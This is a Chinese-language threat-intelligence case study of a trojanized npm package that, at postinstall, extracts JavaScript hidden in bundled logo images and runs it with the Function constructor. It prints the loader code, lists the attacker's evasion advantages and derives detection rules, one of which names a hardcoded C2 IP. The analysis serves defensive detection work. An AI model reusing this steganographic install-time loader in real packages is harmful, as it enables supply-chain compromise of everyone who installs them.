# 典型案例：从威胁情报中提取可操作知识

**来源**: Phylum威胁情报报告  
**包名**: img-aws-s3-object-multipart-copy (npm)  
**版本**: all published versions (as of July 13, 2024)  
**verify.json路径**: `/home2/wenbo/Documents/IntelliGraph/Dataset/IntelliJson/phylum/20240813_211341_983361/verify.json`

## 案例概述

该包是一个木马化的合法库克隆版本，在安装过程中从嵌入的图片文件中提取并执行隐藏的C2后门payload。这种**隐写术攻击**通过在看似无害的图片文件中隐藏恶意代码，绕过静态分析和传统检测方法。

---

## 三种可操作知识的提取

### 1. 恶意代码片段 (Malicious Code Snippet)

**具体攻击实现**：

```javascript
function processImage(filePath) {
    console.log("Processing image...");
    const data = fs.readFileSync(filePath);
    let analyzepixels = "";
    let convertertree = false;

    for (let i = 0; i < data.length; i++) {
        const value = data[i];
        if (value >= 32 && value <= 126) {
            analyzepixels += String.fromCharCode(value);
        } else {
            if (analyzepixels.length > 2000) {
                convertertree = true;
                break;
            }
            analyzepixels = "";
        }
    }
    // ...
    if (convertertree) {
        console.log("Optimization complete. Applying advanced features...");
        imagebyte = analyzepixels; 
    } else {
        console.log("Optimization complete. No advanced features applied.");
    }
    const func = new Function('https', 'exec', 'os', imagebyte);
    func(https, exec, os);
}
processImage('logo1.jpg');
processImage('logo2.jpg');
processImage('logo3.jpg');
```

**触发时机**: postinstall（通过index.js执行）  
**文件位置**: `dist/loadformat.js`  
**所需权限**: 文件系统、网络、child_process、os

---

### 2. 行为描述 (Behavioral Description)

**操作性说明**：

> "At postinstall, the code reads embedded image files (logo1.jpg, logo2.jpg, logo3.jpg), extracts ASCII payloads hidden in the image bytes, and dynamically executes the extracted code as JavaScript using the Function constructor, resulting in arbitrary code execution if a payload is present."

**关键行为特征**：
- 读取和解析图片文件以寻找嵌入的ASCII payload
- 使用Function构造器动态执行提取的代码
- 条件逻辑仅在隐藏代码存在时触发payload
- 在安装期间访问包根目录中的多个图片文件

---

### 3. 专家推理链 (Expert Reasoning)

**为什么可疑 (Why Suspicious)**：
> "Extracting and executing code from image files is a classic steganography-based evasion technique, designed to bypass static analysis and conceal malicious payloads within seemingly benign files. The use of dynamic code execution on extracted data is highly indicative of malicious intent."

**违反的安全原则 (Violated Expectations)**：
- **原则1**: 合法包不应在安装期间从图片文件中提取并执行代码
- **原则2**: 不应对从非代码文件解析的数据使用动态代码执行
- **原则3**: 图像处理库可能会读取图片，但绝不会将其内容作为代码执行

**关键判定指标**：
1. 读取和解析图片文件以寻找ASCII payload
2. 使用Function构造器动态执行提取的代码
3. 条件逻辑仅在隐藏代码存在时触发payload
4. 在安装期间访问包根目录中的多个图片文件

**与合法用途的区别**：
在包安装环境中，没有合法的用例需要执行从图片中提取的代码。图像处理库可能会读取图片，但绝不会将其内容作为代码执行。

---

## 攻击技术分析

### 隐写术（Steganography）攻击原理

1. **隐藏payload**: 攻击者将恶意JavaScript代码作为ASCII字符（32-126）嵌入到图片文件的字节流中
2. **提取逻辑**: 遍历图片字节，提取所有可打印ASCII字符形成字符串
3. **触发条件**: 只有当提取的字符串长度超过2000字符时才执行
4. **动态执行**: 使用`new Function()`构造器将提取的字符串作为JavaScript代码执行

### 技术优势（从攻击者角度）

- ✓ **绕过静态分析**: 恶意代码不在JavaScript文件中，而是隐藏在图片中
- ✓ **看似无害**: 图片文件（logo1.jpg等）看起来是正常的包资源
- ✓ **条件触发**: 只有payload存在时才执行，避免误报
- ✓ **多重保险**: 尝试多个图片文件（logo1.jpg, logo2.jpg, logo3.jpg）

---

## 检测方法提取

基于上述三种知识，可以构建如下检测规则：

### 静态分析
- 检测npm包中是否包含读取图片文件（.jpg, .png等）并对其内容进行字符提取的代码
- 标记任何使用`Function()`或`eval()`对从非代码文件提取的数据进行动态执行的代码
- 检查package.json中是否有postinstall脚本引用可疑入口点

### 动态监控
- 监控npm包安装过程中spawning detached进程的行为
- 检测安装脚本读取和解析图片文件以寻找ASCII payload的行为
- 标记任何向硬编码IP地址（如85.208.108.29）建立出站HTTPS连接的包

### 行为签名
- Postinstall脚本spawn detached进程 + 读取图片文件 + Function/eval动态执行 + 网络连接到硬编码IP

---

## 攻击新颖性

该案例展示了**隐写术在供应链攻击中的应用**，具有以下特点：

1. **技术独特**: 使用图片文件隐藏payload，区别于常见的直接代码混淆
2. **检测困难**: 传统代码扫描器难以发现隐藏在图片中的恶意代码
3. **多阶段攻击**: 结合detached进程、隐写术提取、C2通信的完整攻击链
4. **实战案例**: 真实的npm供应链攻击，具有实际威胁价值

